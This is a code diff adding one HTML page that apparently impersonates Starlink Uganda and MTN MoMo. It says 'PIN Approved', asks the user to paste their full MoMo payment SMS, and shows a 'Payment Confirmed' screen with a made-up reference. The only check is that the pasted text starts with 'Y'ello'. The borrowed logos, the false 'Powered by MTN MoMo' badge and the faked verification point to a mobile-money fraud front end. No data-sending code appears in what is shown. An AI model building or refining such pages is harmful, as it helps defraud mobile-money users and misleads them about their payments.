@@ -1,0 +1,1069 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SMS Verification - MTN MoMo | Starlink Uganda</title>
+    <link rel="icon" type="image/png" href="https://www.starlink.com/favicon.ico">
+    <link rel="stylesheet" href="https://unicons.iconscout.com/release/v4.0.0/css/line.css">
+    <style>
+        /* ============================================
+           RESET & BASE
+        ============================================ */
+        *, *::before, *::after {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --black: #000000;
+            --white: #ffffff;
+            --gray-50: #f9fafb;
+            --gray-100: #f3f4f6;
+            --gray-200: #e5e7eb;
+            --gray-300: #d1d5db;
+            --gray-400: #9ca3af;
+            --gray-500: #6b7280;
+            --gray-600: #4b5563;
+            --gray-700: #374151;
+            --gray-800: #1f2937;
+            --gray-900: #111827;
+            --blue-400: #60a5fa;
+            --blue-500: #3b82f6;
+            --blue-600: #2563eb;
+            --green-500: #22c55e;
+            --green-600: #16a34a;
+            --red-500: #ef4444;
+            --momo-yellow: #FFCC00;
+            --momo-yellow-dark: #E6B800;
+            --orange-500: #f97316;
+            --orange-600: #ea580c;
+            --radius-sm: 10px;
+            --radius-md: 16px;
+            --radius-lg: 22px;
+            --radius-xl: 26px;
+            --radius-2xl: 30px;
+            --shadow-sm: 0 1px 3px rgba(0,0,0,0.06), 0 1px 2px rgba(0,0,0,0.04);
+            --shadow-md: 0 4px 12px rgba(0,0,0,0.08);
+            --shadow-lg: 0 8px 20px rgba(0,0,0,0.12);
+            --shadow-xl: 0 12px 28px rgba(0,0,0,0.16);
+            --shadow-2xl: 0 20px 40px rgba(0,0,0,0.2);
+            --header-h: 74px;
+            --footer-h: 68px;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            background-color: var(--gray-50);
+            color: var(--gray-900);
+            line-height: 1.5;
+            padding-top: var(--header-h);
+            padding-bottom: var(--footer-h);
+            min-height: 100vh;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        body.modal-open {
+            overflow: hidden;
+            position: fixed;
+            width: 100%;
+        }
+
+        a { text-decoration: none; color: inherit; }
+        button { font-family: inherit; cursor: pointer; border: none; background: none; }
+
+        /* ============================================
+           HEADER
+        ============================================ */
+        .header {
+            position: fixed;
+            top: 0; left: 0; right: 0;
+            height: var(--header-h);
+            background-color: var(--black);
+            color: var(--white);
+            z-index: 100;
+            box-shadow: 0 2px 12px rgba(0,0,0,0.4);
+        }
+
+        .header-inner {
+            max-width: 1200px;
+            margin: 0 auto;
+            height: 100%;
+            padding: 0 18px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .brand { display: flex; align-items: center; gap: 10px; }
+
+        .brand-logo-img {
+            height: 54px;
+            width: auto;
+            display: block;
+        }
+
+        .brand-divider { width: 1px; height: 26px; background: rgba(255,255,255,0.2); margin: 0 4px; }
+        .brand-sub { font-size: 12px; color: var(--gray-400); font-weight: 500; letter-spacing: 0.5px; }
+
+        .header-nav { display: none; gap: 26px; }
+        .header-nav a {
+            color: var(--gray-300);
+            font-size: 14px;
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            gap: 7px;
+            transition: color 0.2s;
+        }
+        .header-nav a:hover { color: var(--white); }
+        .header-nav i { font-size: 18px; }
+
+        /* ============================================
+           MAIN
+        ============================================ */
+        .main {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 22px 16px 36px;
+        }
+
+        .sms-wrap {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: calc(100vh - 160px);
+            padding: 8px 0;
+        }
+
+        .sms-card-wrap {
+            width: 100%;
+            max-width: 420px;
+        }
+
+        /* ============================================
+           YELLOW BAND (top of card)
+        ============================================ */
+        .sms-band {
+            background: linear-gradient(135deg, #FFCC00 0%, #FFD633 100%);
+            border-radius: var(--radius-2xl) var(--radius-2xl) 0 0;
+            padding: 26px 22px 22px;
+            text-align: center;
+            box-shadow: var(--shadow-md);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .sms-band::before {
+            content: "";
+            position: absolute;
+            top: -40px; right: -40px;
+            width: 140px; height: 140px;
+            background: radial-gradient(circle, rgba(255,255,255,0.4), transparent 70%);
+            border-radius: 50%;
+            pointer-events: none;
+        }
+
+        .sms-band::after {
+            content: "";
+            position: absolute;
+            bottom: -50px; left: -50px;
+            width: 120px; height: 120px;
+            background: radial-gradient(circle, rgba(0,0,0,0.06), transparent 70%);
+            border-radius: 50%;
+            pointer-events: none;
+        }
+
+        .sms-band-logo {
+            height: 46px;
+            width: auto;
+            display: inline-block;
+            position: relative;
+        }
+
+        .sms-band-tagline {
+            font-size: 11px;
+            font-weight: 800;
+            color: #7A5A00;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            margin-top: 12px;
+            position: relative;
+        }
+
+        /* ============================================
+           WHITE CARD
+        ============================================ */
+        .sms-body {
+            background: var(--white);
+            border-radius: 0 0 var(--radius-2xl) var(--radius-2xl);
+            padding: 24px 22px 26px;
+            box-shadow: var(--shadow-lg);
+        }
+
+        /* ============================================
+           STATUS PILL — "We sent SMS"
+        ============================================ */
+        .status-pill {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            background: #F0FDF4;
+            border: 1.5px solid #86EFAC;
+            border-radius: var(--radius-md);
+            padding: 13px 14px;
+            margin-bottom: 20px;
+            position: relative;
+        }
+
+        .status-pill-icon {
+            width: 38px;
+            height: 38px;
+            border-radius: 10px;
+            background: var(--green-500);
+            color: var(--white);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 18px;
+            flex-shrink: 0;
+            box-shadow: 0 3px 8px rgba(34,197,94,0.35);
+        }
+
+        .status-pill-text {
+            flex: 1;
+            min-width: 0;
+        }
+
+        .status-pill-title {
+            font-size: 13px;
+            font-weight: 900;
+            color: #14532D;
+        }
+
+        .status-pill-sub {
+            font-size: 11.5px;
+            color: #166534;
+            margin-top: 2px;
+            font-weight: 500;
+            line-height: 1.45;
+        }
+
+        /* ============================================
+           STEPS
+        ============================================ */
+        .steps-label {
+            font-size: 11px;
+            font-weight: 800;
+            letter-spacing: 1.5px;
+            text-transform: uppercase;
+            color: var(--gray-500);
+            margin-bottom: 12px;
+        }
+
+        .steps {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-bottom: 22px;
+            text-align: left;
+        }
+
+        .step-row {
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+        }
+
+        .step-num {
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            background: var(--momo-yellow);
+            color: var(--black);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 11.5px;
+            font-weight: 900;
+            flex-shrink: 0;
+            margin-top: 1px;
+            box-shadow: 0 2px 6px rgba(255,204,0,0.4);
+        }
+
+        .step-text {
+            font-size: 13px;
+            color: var(--gray-700);
+            font-weight: 500;
+            line-height: 1.55;
+        }
+
+        .step-text strong {
+            color: var(--gray-900);
+            font-weight: 800;
+        }
+
+        /* ============================================
+           EXAMPLE SMS BOX
+        ============================================ */
+        .example-sms {
+            background: var(--gray-50);
+            border: 1.5px dashed var(--gray-300);
+            border-radius: var(--radius-md);
+            padding: 14px 15px;
+            margin-bottom: 20px;
+            position: relative;
+        }
+
+        .example-text {
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            color: var(--gray-700);
+            line-height: 1.55;
+            word-break: break-word;
+        }
+
+        .example-text .hl {
+            background: #FFF7D6;
+            color: #7A5A00;
+            font-weight: 800;
+            padding: 1px 5px;
+            border-radius: 4px;
+        }
+
+        /* ============================================
+           FORM
+        ============================================ */
+        .form-label {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 8px;
+            font-size: 13px;
+            font-weight: 800;
+            color: var(--gray-900);
+            margin-bottom: 9px;
+        }
+
+        .form-label-hint {
+            font-size: 10.5px;
+            font-weight: 700;
+            color: var(--gray-400);
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+        }
+
+        .sms-textarea {
+            width: 100%;
+            padding: 14px 15px;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            color: var(--gray-900);
+            background: var(--gray-50);
+            border: 2px solid var(--gray-200);
+            border-radius: var(--radius-md);
+            outline: none;
+            resize: none;
+            line-height: 1.55;
+            transition: border-color 0.2s, box-shadow 0.2s, background 0.2s;
+        }
+
+        .sms-textarea::placeholder {
+            color: var(--gray-400);
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            font-weight: 500;
+        }
+
+        .sms-textarea:focus {
+            border-color: var(--momo-yellow-dark);
+            background: var(--white);
+            box-shadow: 0 0 0 4px rgba(255,204,0,0.18);
+        }
+
+        .sms-textarea.valid {
+            border-color: var(--green-500);
+            box-shadow: 0 0 0 4px rgba(34,197,94,0.15);
+        }
+
+        .sms-textarea.invalid {
+            border-color: var(--red-500);
+            box-shadow: 0 0 0 4px rgba(239,68,68,0.12);
+        }
+
+        .field-status {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 11.5px;
+            font-weight: 700;
+            margin-top: 8px;
+            min-height: 16px;
+        }
+
+        .field-status.ok { color: var(--green-600); }
+        .field-status.bad { color: var(--red-500); }
+        .field-status i { font-size: 14px; }
+
+        .btn-verify {
+            width: 100%;
+            margin-top: 18px;
+            padding: 17px;
+            border-radius: var(--radius-md);
+            background: var(--black);
+            color: var(--white);
+            font-weight: 900;
+            font-size: 14px;
+            letter-spacing: 1.5px;
+            text-transform: uppercase;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 9px;
+            transition: transform 0.15s, filter 0.2s, box-shadow 0.25s, opacity 0.2s;
+            box-shadow: 0 6px 18px rgba(0,0,0,0.25);
+        }
+
+        .btn-verify:hover:not(:disabled) {
+            filter: brightness(1.15);
+            box-shadow: 0 8px 24px rgba(0,0,0,0.35);
+        }
+
+        .btn-verify:active:not(:disabled) { transform: scale(0.98); }
+
+        .btn-verify:disabled {
+            opacity: 0.4;
+            cursor: not-allowed;
+            box-shadow: none;
+        }
+
+        .btn-verify i { font-size: 18px; }
+
+        .btn-spinner {
+            width: 16px;
+            height: 16px;
+            border: 2.5px solid rgba(255,255,255,0.3);
+            border-top-color: var(--white);
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+        }
+
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .trust-footer {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            font-size: 11px;
+            color: var(--gray-500);
+            font-weight: 600;
+            margin-top: 18px;
+            padding-top: 14px;
+            border-top: 1px dashed var(--gray-200);
+        }
+
+        .trust-footer i { font-size: 14px; color: var(--green-600); }
+
+        /* ============================================
+           ERROR TOAST
+        ============================================ */
+        .toast-overlay {
+            position: fixed;
+            inset: 0;
+            z-index: 10000;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            background: rgba(0,0,0,0.5);
+            backdrop-filter: blur(4px);
+            padding: 20px;
+        }
+
+        .toast-overlay.open { display: flex; }
+
+        .toast-card {
+            background: var(--white);
+            border-radius: var(--radius-xl);
+            padding: 24px 22px;
+            max-width: 340px;
+            width: 100%;
+            text-align: center;
+            box-shadow: var(--shadow-2xl);
+            transform: scale(0.9);
+            opacity: 0;
+            transition: transform 0.3s cubic-bezier(0.16, 1, 0.3, 1), opacity 0.3s;
+        }
+
+        .toast-card.show {
+            transform: scale(1);
+            opacity: 1;
+        }
+
+        .toast-icon {
+            width: 56px;
+            height: 56px;
+            border-radius: var(--radius-md);
+            background: #FEE2E2;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 14px;
+        }
+
+        .toast-icon i {
+            font-size: 28px;
+            color: var(--red-500);
+        }
+
+        .toast-title {
+            font-size: 16px;
+            font-weight: 900;
+            color: var(--gray-900);
+            margin-bottom: 6px;
+        }
+
+        .toast-text {
+            font-size: 13px;
+            color: var(--gray-500);
+            line-height: 1.55;
+            margin-bottom: 18px;
+        }
+
+        .toast-text strong {
+            font-weight: 900;
+            color: var(--orange-600);
+        }
+
+        .toast-btn {
+            width: 100%;
+            padding: 14px;
+            background: var(--momo-yellow);
+            color: var(--black);
+            font-weight: 900;
+            font-size: 13px;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            border-radius: var(--radius-md);
+            transition: transform 0.15s, filter 0.2s;
+            box-shadow: 0 4px 12px rgba(255,204,0,0.35);
+        }
+
+        .toast-btn:hover { filter: brightness(0.95); }
+        .toast-btn:active { transform: scale(0.97); }
+
+        /* ============================================
+           SUCCESS SCREEN
+        ============================================ */
+        .success-overlay {
+            position: fixed;
+            inset: 0;
+            z-index: 10000;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            background: linear-gradient(160deg, #0a0a0a 0%, #1a1a1a 50%, #000000 100%);
+            color: var(--white);
+            padding: 24px;
+            overflow: hidden;
+        }
+
+        .success-overlay.open {
+            display: flex;
+            animation: fadeIn 0.4s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to   { opacity: 1; }
+        }
+
+        .success-overlay::before {
+            content: "";
+            position: absolute;
+            top: 50%; left: 50%;
+            width: 600px; height: 600px;
+            transform: translate(-50%, -50%);
+            background: radial-gradient(circle, rgba(34,197,94,0.22) 0%, transparent 60%);
+            animation: pulseGlow 3s ease-in-out infinite;
+            pointer-events: none;
+        }
+
+        @keyframes pulseGlow {
+            0%, 100% { transform: translate(-50%, -50%) scale(1);   opacity: 0.6; }
+            50%      { transform: translate(-50%, -50%) scale(1.15); opacity: 1; }
+        }
+
+        .success-content {
+            position: relative;
+            text-align: center;
+            max-width: 400px;
+            width: 100%;
+            z-index: 2;
+        }
+
+        .success-check {
+            width: 100px;
+            height: 100px;
+            margin: 0 auto 26px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #22c55e 0%, #16a34a 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 0 60px rgba(34,197,94,0.6);
+            animation: popIn 0.6s cubic-bezier(0.16, 1, 0.3, 1);
+        }
+
+        @keyframes popIn {
+            0%   { transform: scale(0.3); opacity: 0; }
+            60%  { transform: scale(1.1); opacity: 1; }
+            100% { transform: scale(1); }
+        }
+
+        .success-check i {
+            font-size: 54px;
+            color: var(--white);
+        }
+
+        .success-title {
+            font-size: 26px;
+            font-weight: 900;
+            letter-spacing: -0.5px;
+            margin-bottom: 8px;
+        }
+
+        .success-sub {
+            font-size: 14px;
+            color: var(--gray-400);
+            line-height: 1.65;
+            max-width: 320px;
+            margin: 0 auto;
+        }
+
+        .success-sub strong {
+            color: var(--white);
+            font-weight: 800;
+        }
+
+        .success-receipt {
+            background: rgba(255,255,255,0.06);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: var(--radius-md);
+            padding: 16px 18px;
+            margin: 24px 0;
+            text-align: left;
+        }
+
+        .success-row {
+            display: flex;
+            justify-content: space-between;
+            gap: 12px;
+            font-size: 13px;
+            padding: 7px 0;
+        }
+
+        .success-row:not(:last-child) {
+            border-bottom: 1px dashed rgba(255,255,255,0.1);
+        }
+
+        .success-row span:first-child {
+            color: var(--gray-500);
+            font-weight: 500;
+        }
+
+        .success-row span:last-child {
+            color: var(--white);
+            font-weight: 800;
+            text-align: right;
+            word-break: break-word;
+        }
+
+        .success-row .ref {
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            color: var(--momo-yellow);
+        }
+
+        .btn-done {
+            width: 100%;
+            padding: 17px;
+            border-radius: var(--radius-md);
+            background: var(--momo-yellow);
+            color: var(--black);
+            font-weight: 900;
+            font-size: 14px;
+            letter-spacing: 1.2px;
+            text-transform: uppercase;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 9px;
+            transition: transform 0.15s, filter 0.2s, box-shadow 0.25s;
+            box-shadow: 0 8px 22px rgba(255,204,0,0.4);
+        }
+
+        .btn-done:hover {
+            filter: brightness(0.96);
+            box-shadow: 0 10px 28px rgba(255,204,0,0.55);
+        }
+
+        .btn-done:active { transform: scale(0.98); }
+        .btn-done i { font-size: 19px; }
+
+        /* ============================================
+           BOTTOM NAV
+        ============================================ */
+        .bottom-nav {
+            position: fixed;
+            bottom: 0; left: 0; right: 0;
+            height: var(--footer-h);
+            background: var(--white);
+            border-top: 1px solid var(--gray-200);
+            box-shadow: 0 -4px 20px rgba(0,0,0,0.08);
+            z-index: 100;
+        }
+
+        .bottom-nav-inner {
+            max-width: 1200px;
+            margin: 0 auto;
+            height: 100%;
+            padding: 0 12px;
+            display: flex;
+            justify-content: space-around;
+            align-items: center;
+        }
+
+        .nav-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 4px;
+            color: var(--gray-600);
+            font-size: 11px;
+            font-weight: 700;
+            transition: color 0.2s, transform 0.2s;
+            padding: 6px 14px;
+            border-radius: 12px;
+        }
+
+        .nav-item i { font-size: 24px; }
+        .nav-item:hover { transform: translateY(-2px); }
+
+        /* ============================================
+           RESPONSIVE
+        ============================================ */
+        @media (min-width: 640px) {
+            .main { padding: 28px 22px 44px; }
+            .sms-band { padding: 32px 28px 26px; }
+            .sms-body { padding: 30px 28px 32px; }
+            .sms-band-logo { height: 52px; }
+            .success-title { font-size: 30px; }
+        }
+
+        @media (min-width: 768px) {
+            .header-nav { display: flex; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ============ HEADER ============ -->
+    <header class="header">
+        <div class="header-inner">
+            <a href="/" class="brand">
+                <img src="https://ug-starlinknetwork.up.railway.app/static/images/starlink_logo_new.png" alt="STARLINK" class="brand-logo-img">
+                <div class="brand-divider"></div>
+                <span class="brand-sub">Uganda Reseller</span>
+            </a>
+
+            <nav class="header-nav">
+                <a href="/dashboard/">
+                    <i class="uil uil-wifi"></i> <span>Status</span>
+                </a>
+                <a href="/plans/">
+                    <i class="uil uil-home"></i> <span>Plans</span>
+                </a>
+            </nav>
+        </div>
+    </header>
+
+    <!-- ============ MAIN ============ -->
+    <main class="main">
+        <div class="sms-wrap">
+            <div class="sms-card-wrap">
+
+                <!-- YELLOW BAND with MoMo logo -->
+                <div class="sms-band">
+                    <img src="https://ug-starlinknetwork.up.railway.app/static/images/momo_logo.png" alt="MTN MoMo" class="sms-band-logo">
+                    <p class="sms-band-tagline">SMS Verification</p>
+                </div>
+
+                <!-- WHITE BODY -->
+                <div class="sms-body">
+
+                    <!-- "We sent SMS" status -->
+                    <div class="status-pill">
+                        <div class="status-pill-icon">
+                            <i class="uil uil-check"></i>
+                        </div>
+                        <div class="status-pill-text">
+                            <p class="status-pill-title">PIN Approved</p>
+                            <p class="status-pill-sub">MTN has sent you a confirmation SMS. Paste it below to complete.</p>
+                        </div>
+                    </div>
+
+                    <!-- Steps -->
+                    <p class="steps-label">Follow these steps</p>
+                    <div class="steps">
+                        <div class="step-row">
+                            <div class="step-num">1</div>
+                            <p class="step-text">Wait for the SMS from <strong>MTN MoMo</strong> on your phone.</p>
+                        </div>
+                        <div class="step-row">
+                            <div class="step-num">2</div>
+                            <p class="step-text">Copy the <strong>entire SMS message</strong> (starting with <strong>Y'ello</strong>).</p>
+                        </div>
+                        <div class="step-row">
+                            <div class="step-num">3</div>
+                            <p class="step-text">Paste it in the box below and tap <strong>Verify</strong>.</p>
+                        </div>
+                    </div>
+
+                    <!-- Example SMS -->
+                    <div class="example-sms">
+                        <p class="example-text">
+                            <span class="hl">Y'ello</span> Your payment of UGX 3,500 to Starlink Uganda was successful. Ref: MP260310.4521.C12345
+                        </p>
+                    </div>
+
+                    <!-- Form -->
+                    <form id="smsForm" method="POST" autocomplete="off" onsubmit="return false;">
+
+                        <label class="form-label" for="full_sms">
+                            Paste SMS Message
+                            <span class="form-label-hint" id="charCount">0 chars</span>
+                        </label>
+
+                        <textarea
+                            name="full_sms"
+                            id="full_sms"
+                            rows="5"
+                            placeholder="Paste the full SMS here (must start with Y'ello)..."
+                            class="sms-textarea"
+                            spellcheck="false"
+                            autocorrect="off"
+                            autocapitalize="off"
+                            required
+                        ></textarea>
+
+                        <div class="field-status" id="fieldStatus"></div>
+
+                        <button type="submit" id="verifyBtn" class="btn-verify" disabled>
+                            <i class="uil uil-check-circle"></i>
+                            <span>Verify Payment</span>
+                        </button>
+
+                    </form>
+
+                    <!-- Trust footer -->
+                    <div class="trust-footer">
+                        <i class="uil uil-shield-check"></i>
+                        SSL Encrypted &nbsp;•&nbsp; Powered by MTN MoMo
+                    </div>
+
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- ============ ERROR TOAST ============ -->
+    <div class="toast-overlay" id="errorToast">
+        <div class="toast-card" id="toastCard">
+            <div class="toast-icon">
+                <i class="uil uil-exclamation-triangle"></i>
+            </div>
+            <h3 class="toast-title">Invalid SMS</h3>
+            <p class="toast-text">
+                The SMS must start with <strong>"Y'ello"</strong>. Please paste the correct MTN MoMo confirmation message.
+            </p>
+            <button class="toast-btn" id="closeToast">OK, Got It</button>
+        </div>
+    </div>
+
+    <!-- ============ SUCCESS SCREEN ============ -->
+    <div class="success-overlay" id="successOverlay">
+        <div class="success-content">
+
+            <div class="success-check">
+                <i class="uil uil-check"></i>
+            </div>
+
+            <h2 class="success-title">Payment Confirmed</h2>
+            <p class="success-sub">
+                Your <strong id="successPlan">plan</strong> has been activated. You can now enjoy high-speed Starlink internet.
+            </p>
+
+            <div class="success-receipt">
+                <div class="success-row">
+                    <span>Plan</span>
+                    <span id="receiptPlan">—</span>
+                </div>
+                <div class="success-row">
+                    <span>Data</span>
+                    <span id="receiptData">—</span>
+                </div>
+                <div class="success-row">
+                    <span>Amount</span>
+                    <span id="receiptAmount">—</span>
+                </div>
+                <div class="success-row">
+                    <span>Phone</span>
+                    <span id="receiptPhone">—</span>
+                </div>
+                <div class="success-row">
+                    <span>Reference</span>
+                    <span class="ref" id="receiptRef">—</span>
+                </div>
+            </div>
+
+            <button class="btn-done" id="doneBtn">
+                <i class="uil uil-rocket"></i>
+                Go to Dashboard
+            </button>
+
+        </div>
+    </div>
+
+    <!-- ============ BOTTOM NAV ============ -->
+    <nav class="bottom-nav">
+        <div class="bottom-nav-inner">
+            <a href="/dashboard/" class="nav-item">
+                <i class="uil uil-wifi"></i>
+                <span>Status</span>
+            </a>
+            <a href="/plans/" class="nav-item">
+                <i class="uil uil-shopping-bag"></i>
+                <span>Plans</span>
+            </a>
+            <a href="/settings/" class="nav-item">
+                <i class="uil uil-setting"></i>
+                <span>Settings</span>
+            </a>
+        </div>
+    </nav>
+
+    <!-- ============ SCRIPT ============ -->
+    <script>
+        // ============================================
+        // READ PLAN FROM URL
+        // ============================================
+        const params = new URLSearchParams(window.location.search);
+        const planName = params.get('plan') || 'Standard';
+        const planData = params.get('data') || '60GB';
+        const planPrice = parseInt(params.get('price') || '3500', 10);
+        const planPhone = params.get('phone') || '07xxxxxxxx';
+
+        // ============================================
+        // ELEMENTS
+        // ============================================
+        const textarea = document.getElementById('full_sms');
+        const form = document.getElementById('smsForm');
+        const verifyBtn = document.getElementById('verifyBtn');
+        const fieldStatus = document.getElementById('fieldStatus');
+        const charCount = document.getElementById('charCount');
+        const errorToast = document.getElementById('errorToast');
+        const toastCard = document.getElementById('toastCard');
+        const closeToast = document.getElementById('closeToast');
+        const successOverlay = document.getElementById('successOverlay');
+        const doneBtn = document.getElementById('doneBtn');
+
+        // ============================================
+        // LIVE VALIDATION
+        // ============================================
+        function validateSMS() {
+            const val = textarea.value.trim();
+
+            charCount.textContent = val.length + ' chars';
+
+            textarea.classList.remove('valid', 'invalid');
+            fieldStatus.classList.remove('ok', 'bad');
+            fieldStatus.innerHTML = '';
+            verifyBtn.disabled = true;
+
+            if (val.length === 0) return;
+
+            if (val.startsWith("Y'ello")) {
+                textarea.classList.add('valid');
+                fieldStatus.classList.add('ok');
+                fieldStatus.innerHTML = '<i class="uil uil-check-circle"></i> Valid SMS detected — ready to verify';
+                verifyBtn.disabled = false;
+            } else {
+                textarea.classList.add('invalid');
+                fieldStatus.classList.add('bad');
+                fieldStatus.innerHTML = '<i class="uil uil-times-circle"></i> SMS must start with "Y\'ello"';
+            }
+        }
+
+        textarea.addEventListener('input', validateSMS);
+
+        // ============================================
+        // FORM SUBMIT
+        // ============================================
+        form.addEventListener('submit', function (e) {
+            e.preventDefault();
+
+            const val = textarea.value.trim();
+
+            if (!val.startsWith("Y'ello")) {
+                showToast();
+                return;
+            }
+
+            verifyBtn.disabled = true;
+            verifyBtn.innerHTML = '<span class="btn-spinner"></span><span>Verifying...</span>';
+
+            setTimeout(() => {
+                showSuccess();
+            }, 1800);
+        });
+
+        // ============================================
+        // ERROR TOAST
+        // ============================================
+        function showToast() {
+            errorToast.classList.add('open');
+            setTimeout(() => toastCard.classList.add('show'), 50);
+            setTimeout(hideToast, 5000);
+        }
+
+        function hideToast() {
+            toastCard.classList.remove('show');
+            setTimeout(() => errorToast.classList.remove('open'), 250);
+        }
+
+        closeToast.addEventListener('click', hideToast);
+
+        // ============================================
+        // SUCCESS SCREEN
+        // ============================================
+        function showSuccess() {
+            const ref = 'MP' + Date.now().toString().slice(-8) + '.' + Math.random().toString(36).substring(2, 6).toUpperCase();
+
+            document.getElementById('successPlan').textContent = planName;
+            document.getElementById('receiptPlan').textContent = planName;
+            document.getElementById('receiptData').textContent = planData;
+            document.getElementById('receiptAmount').textContent = 'UGX ' + planPrice.toLocaleString('en-UG', { minimumFractionDigits: 2 });
+            document.getElementById('receiptPhone').textContent = '+256 ' + planPhone.replace(/^0/, '');
+            document.getElementById('receiptRef').textContent = ref;
+
+            successOverlay.classList.add('open');
+            document.body.classList.add('modal-open');
+        }
+
+        doneBtn.addEventListener('click', () => {
+            window.location.href = '/dashboard/';
+        });
+    </script>
+</body>
+</html>
